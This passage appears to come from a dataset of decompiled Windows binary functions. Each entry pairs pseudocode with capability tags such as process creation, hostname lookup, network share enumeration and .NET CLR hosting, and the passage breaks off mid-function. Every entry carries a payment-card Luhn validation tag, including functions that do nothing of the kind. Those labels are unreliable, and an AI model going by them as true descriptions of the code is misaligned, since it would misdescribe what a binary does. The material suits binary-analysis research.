        "decompiled_code": "\nvoid __fastcall fcn.0046b30c(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t iStack24;\n    \n    iVar5 = *(in_EAX + 0xb58 + param_1 * 4);\n    puVar1 = param_2 + iVar5 * 4;\n    iStack24 = param_1;\n    while (iVar7 = iStack24 * 2,  iVar7 <= *(in_EAX + 0x144c)) {\n        if ((iVar7 < *(in_EAX + 0x144c)) &&\n           ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) < *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) ||\n            ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) == *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) &&\n             (uVar3 = *(in_EAX + 0x1454 + *(in_EAX + 0xb5c + iStack24 * 8)), \n             puVar2 = in_EAX + 0x1454 + *(in_EAX + 0xb58 + iStack24 * 8),  uVar3 < *puVar2 || uVar3 == *puVar2)))))) {\n            iVar7 = iVar7 + 1;\n        }\n        uVar4 = *(param_2 + *(in_EAX + 0xb58 + iVar7 * 4) * 4);\n        if ((*puVar1 <= uVar4 && uVar4 != *puVar1) ||\n           ((iVar6 = *(in_EAX + 0xb58 + iVar7 * 4),  *(param_2 + iVar6 * 4) == *puVar1 &&\n            (uVar3 = *(in_EAX + 0x1454 + iVar5),  puVar2 = in_EAX + 0x1454 + iVar6,  uVar3 < *puVar2 || uVar3 == *puVar2\n            )))) break;\n        *(in_EAX + 0xb58 + iStack24 * 4) = *(in_EAX + 0xb58 + iVar7 * 4);\n        iStack24 = iVar7;\n    }\n    *(in_EAX + 0xb58 + iStack24 * 4) = iVar5;\n    return;\n}\n",
        "token_count": 629
    },
    "0046b600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b600(int16_t *param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint16_t *puVar4;\n    int16_t iVar5;\n    int16_t aiStack44 [16];\n    \n    iVar5 = 0;\n    iVar2 = 1;\n    piVar3 = aiStack44;\n    do {\n        piVar3 = piVar3 + 1;\n        iVar5 = (*param_1 + iVar5) * 2;\n        *piVar3 = iVar5;\n        iVar2 = iVar2 + 1;\n        param_1 = param_1 + 1;\n    } while (iVar2 < 0x10);\n    iVar2 = 0;\n    puVar4 = in_EAX + 2;\n    if (-1 < param_2) {\n        do {\n            if (*puVar4 != 0) {\n                aiStack44[*puVar4] = aiStack44[*puVar4] + 1;\n                uVar1 = fcn.0046cedc();\n                puVar4[-1] = uVar1;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 2;\n        } while (iVar2 <= param_2);\n    }\n    return;\n}\n",
        "token_count": 314
    },
    "0046d36c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0046d36c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x46d382;\n    fcn.004059cc();\n    uStack20 = 0x46d3d9;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864(0, 0);\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x46d3f8, 0x46d3f0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x46d3e0);\n    return;\n}\n",
        "token_count": 240
    },
    "0046d9e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0046d9e0(void)\n\n{\n    uint uStack28;\n    uchar auStack24 [20];\n    \n    uStack28 = 0x10;\n    sub.kernel32.dll_GetComputerNameA(auStack24, &uStack28);\n    fcn.004057a0();\n    return;\n}\n",
        "token_count": 71
    },
    "0046e3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e3f0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint pszPath;\n    uint pidl;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = NULL;\n    var_10h = 0;\n    puStack312 = 0x46e425;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack312 = 0x46e42d;\n    fcn.004059cc();\n    puStack312 = 0x46e435;\n    fcn.004059cc();\n    uStack316 = 0x46e55e;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack312 = &stack0xfffffffc;\n    iVar1 = sub.shell32.dll_SHGetSpecialFolderLocation(0, 0x10, &fcn.0046e3f0::pidl);\n    if (iVar1 == 0) {\n        sub.shell32.dll_SHGetPathFromIDListA(pidl, &fcn.0046e3f0::pszPath);\n        fcn.0042be44();\n        fcn.00407050();\n        uVar2 = fcn.004059dc();\n        (**(*var_14h + 0x1c))(var_14h, uVar2);\n        uVar2 = fcn.004059dc();\n        (**(*var_14h + 0x50))(var_14h, uVar2);\n        (**(*var_14h + 0x3c))(var_14h, 5);\n        fcn.004057a0();\n        fcn.004058e0(0x46e590, var_8h, 0x46e584, 0);\n        uVar2 = fcn.0040646c(0xffffffff);\n        fcn.00407050(uVar2);\n        (**(_pe_dos_header + 0x18))(0);\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040700c(0x46e565);\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 606
    },
    "0046e724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0046e724(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iStack76;\n    int32_t iStack72;\n    uchar *var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 8;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x46e984;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046e724::var_20h;\n    var_24h = 0x46e74b;\n    var_ch = unaff_EBX;\n    iVar2 = fcn.004032f8();\n    if (iVar2 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_24h = 0x46e763;\n        fcn.00403358();\n        var_24h = 0x46e76b;\n        var_4h = fcn.004059dc();\n    }\n    var_24h = 0x46e775;\n    fcn.00405530();\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = NULL;\n    var_24h = &fcn.0046e724::var_18h;\n    var_28h = &fcn.0046e724::var_14h;\n    var_2ch = &fcn.0046e724::var_10h;\n    var_30h = 0xffffffff;\n    var_34h = &fcn.0046e724::var_8h;\n    var_38h = 0;\n    var_3ch = var_4h;\n    var_40h = 0x46e7a1;\n    iVar2 = sub.netapi32.dll_NetShareEnum();\n    if (iVar2 == 0) {\n        iVar2 = var_10h;\n        if (0 < var_10h) {\n            do {\n                iStack76 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb4;\n                iStack72 = var_4h;\n                var_40h = &stack0xfffffffc;\n                iVar1 = sub.netapi32.dll_NetShareGetInfo();\n                if (iVar1 == 0) {\n                    fcn.00405728();\n                    fcn.00405818();\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46e99c;\n                    uVar3 = *(var_ch + 4);\n                    uVar5 = 0;\n                    fcn.00409e5c(uVar3);\n                    fcn.004058e0(var_24h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405728(0x46e99c, *in_EAX);\n                    fcn.004058e0(var_28h);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46e99c;\n                    uVar3 = *(var_ch + 0xc);\n                    uVar5 = 0;\n                    fcn.00409e5c(uVar3);\n                    fcn.004058e0(var_2ch, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46e99c;\n                    uVar3 = *(var_ch + 0x10);\n                    uVar5 = 0;\n                    fcn.00409e5c(uVar3);\n                    fcn.004058e0(var_30h, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46e99c;\n                    uVar3 = *(var_ch + 0x14);\n                    uVar5 = 0;\n                    fcn.00409e5c(uVar3);\n                    fcn.004058e0(var_34h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405728(0x46e99c, *in_EAX);\n                    fcn.004058e0(var_38h);\n                    fcn.00405728(0x46e99c, *in_EAX);\n                    fcn.004058e0(var_3ch);\n                    fcn.00409e5c(*(var_ch + 0x20));\n                    iStack72 = 0x46e9a8;\n                    fcn.004058e0();\n                }\n                iStack76 = var_ch;\n                sub.netapi32.dll_NetApiBufferFree();\n                *in_FS_OFFSET = iStack76;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        var_3ch = var_8h;\n        iStack72 = 0x46e969;\n        sub.netapi32.dll_NetApiBufferFree();\n    }\n    *in_FS_OFFSET = var_3ch;\n    var_34h = 0x46e98b;\n    var_38h = 0x46e983;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1396
    },
    "0046e9f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046e9f8(void)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46ea11;\n    fcn.004059cc();\n    puStack28 = 0x46ea19;\n    fcn.004059cc();\n    uStack32 = 0x46eaa8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004216c4();\n    piVar1 = fcn.00404620();\n    fcn.00409edc();\n    fcn.0046e9ac();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421dd8();\n    (**(*piVar1 + 0x1c))();\n    fcn.00421770();\n    fcn.00404650();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46eaaf;\n    uStack32 = 0x46eaa7;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 307
    },
    "0046ee98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ee98(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46eeaf;\n    fcn.004059cc();\n    puStack24 = 0x46eeb7;\n    fcn.004059cc();\n    puStack24 = 0x46eebf;\n    fcn.004059cc();\n    puStack24 = 0x46eec7;\n    fcn.004059cc();\n    uStack28 = 0x46ef73;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x46eee1;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.004216c4();\n    puStack36 = 0x46eeec;\n    fcn.00409edc();\n    puStack36 = 0x46eef1;\n    fcn.0046e9ac();\n    uStack40 = 0x46ef49;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00409edc();\n    fcn.004220e0();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46ef50;\n    uStack40 = 0x46ef40;\n    fcn.00421770();\n    uStack40 = 0x46ef48;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 435
    },
    "0046ef80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ef80(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46ef97;\n    fcn.004059cc();\n    puStack24 = 0x46ef9f;\n    fcn.004059cc();\n    puStack24 = 0x46efa7;\n    fcn.004059cc();\n    puStack24 = 0x46efaf;\n    fcn.004059cc();\n    uStack28 = 0x46f054;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x46efc9;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.004216c4();\n    puStack36 = 0x46efd4;\n    fcn.00409edc();\n    puStack36 = 0x46efd9;\n    fcn.0046e9ac();\n    uStack40 = 0x46f02a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00422038();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46f031;\n    uStack40 = 0x46f021;\n    fcn.00421770();\n    uStack40 = 0x46f029;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 426
    },
    "0046f064": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f064(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46f07b;\n    fcn.004059cc();\n    puStack24 = 0x46f083;\n    fcn.004059cc();\n    puStack24 = 0x46f08b;\n    fcn.004059cc();\n    puStack24 = 0x46f093;\n    fcn.004059cc();\n    uStack28 = 0x46f138;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x46f0ad;\n    puStack24 = &stack0xfffffffc;\n    var_10h = fcn.004216c4();\n    puStack36 = 0x46f0b8;\n    fcn.00409edc();\n    puStack36 = 0x46f0bd;\n    fcn.0046e9ac();\n    uStack40 = 0x46f10e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00422008();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46f115;\n    uStack40 = 0x46f105;\n    fcn.00421770();\n    uStack40 = 0x46f10d;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 431
    },
    "0046ff10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046ff10(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46ff29;\n    fcn.004059cc();\n    puStack28 = 0x46ff31;\n    fcn.004059cc();\n    puStack28 = 0x46ff39;\n    fcn.004059cc();\n    uStack32 = 0x46ffc2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004216c4();\n    bVar1 = true;\n    fcn.00405974();\n    if (!bVar1) {\n        fcn.00405974();\n    }\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421d50();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46ffc9;\n    uStack32 = 0x46ffc1;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 292
    },
    "00470784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00470784(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x47079e;\n    fcn.004059cc();\n    var_10h = 0x4708b9;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00470784::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045eac4(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045eac4(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045eac4(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_8h, 0x4708c4, var_ch);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x4708c0);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 598
    },
    "004708d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.004708d0(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x4708ea;\n    fcn.004059cc();\n    var_10h = 0x470a03;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004708d0::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045eac4(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045eac4(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045eac4(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_ch, 0x470a10, 0xffffffff);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x470a0a);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 597
    },
    "00470a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00470a1c(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 5;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0x470a36;\n    fcn.004059cc();\n    var_10h = 0x470b4f;\n    var_14h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00470a1c::var_14h;\n    var_ch = &stack0xfffffffc;\n    uVar2 = fcn.0040700c();\n    fcn.0045eac4(uVar2);\n    piVar1 = var_14h;\n    (**(*var_14h + 0x68))(var_14h);\n    fcn.0040711c();\n    fcn.00407024();\n    piVar3 = fcn.0040700c();\n    uVar2 = fcn.00405d28();\n    fcn.0045eac4(uVar2);\n    (**(*piVar3 + 0x90))();\n    fcn.0040711c();\n    fcn.00405ea8(piVar1);\n    fcn.0045eac4(uVar2);\n    (**(*piVar3 + 0x44))();\n    fcn.0040711c();\n    fcn.00407024();\n    fcn.0040648c(0, var_ch, 0x470b5c, 0);\n    *in_FS_OFFSET = piVar3;\n    fcn.0040700c(0x470b56);\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.00405d28();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 599
    },
    "004712a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004712a4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4712be;\n    fcn.004059cc();\n    uStack28 = 0x471332;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.004216c4();\n    fcn.004217a0();\n    fcn.00405864();\n    fcn.004218e4();\n    fcn.00422068();\n    fcn.00404650();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x471339;\n    uStack28 = 0x471331;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 213
    },
    "00472974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472974(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x47298d;\n    fcn.004059cc();\n    uStack24 = 0x4729d0;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0040a5a0(param_2);\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack28 = 0x4729d7;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 206
    },
    "00473358": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473358(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY56;\n    uint uStackY52;\n    uchar *puStackY48;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x473378;\n    fcn.004059cc();\n    puStack32 = 0x473380;\n    fcn.004059cc();\n    puStack32 = 0x473388;\n    fcn.004059cc();\n    puStack32 = 0x473390;\n    fcn.004059cc();\n    puStack32 = 0x473398;\n    fcn.004059cc();\n    puStack32 = 0x4733a0;\n    fcn.004059cc();\n    uStack36 = 0x473438;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStackY48 = 0x4733c0;\n    puStack32 = &stack0xfffffffc;\n    cVar1 = fcn.00473448(arg_10h);\n    if (cVar1 != '\\0') {\n        uStackY52 = 0x473409;\n        uStackY56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        puStackY48 = &stack0xfffffffc;\n        fcn.0040a68c();\n        fcn.00405864();\n        fcn.00473560();\n        *in_FS_OFFSET = uStackY56;\n        puStackY48 = 0x473410;\n        uStackY52 = 0x473408;\n        fcn.00473540();\n        return;\n    }\n    *in_FS_OFFSET = arg_10h;\n    uStack36 = 0x47343f;\n    uStack40 = 0x47342a;\n    fcn.00405554();\n    uStack40 = 0x473437;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 505
    },
    "00473a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00473a40(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.SHFolder.dll_SHGetFolderPathA(0);\n    if ((uVar1 & 0x80000000) == 0) {\n        fcn.004057a0();\n    }\n    else {\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00473e74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00473e74(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int16_t iVar3;\n    \n    iVar1 = *(in_EAX + 0x3c);\n    uVar2 = fcn.00402f00();\n    fcn.00403af4();\n    fcn.00408560();\n    iVar3 = *(iVar1 + in_EAX + 6);\n    do {\n        fcn.00408560();\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return CONCAT44(in_EAX, uVar2);\n}\n",
        "token_count": 145
    },
    "00474f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00474f80(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_84h;\n    uint var_80h;\n    uint var_6ch;\n    uint uStack108;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack208 = 0x474f9e;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack208 = 0x474fa6;\n    fcn.004059cc();\n    uStack212 = 0x475246;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff28;\n    puStack208 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_b0h = 0x44;\n    var_84h = 1;\n    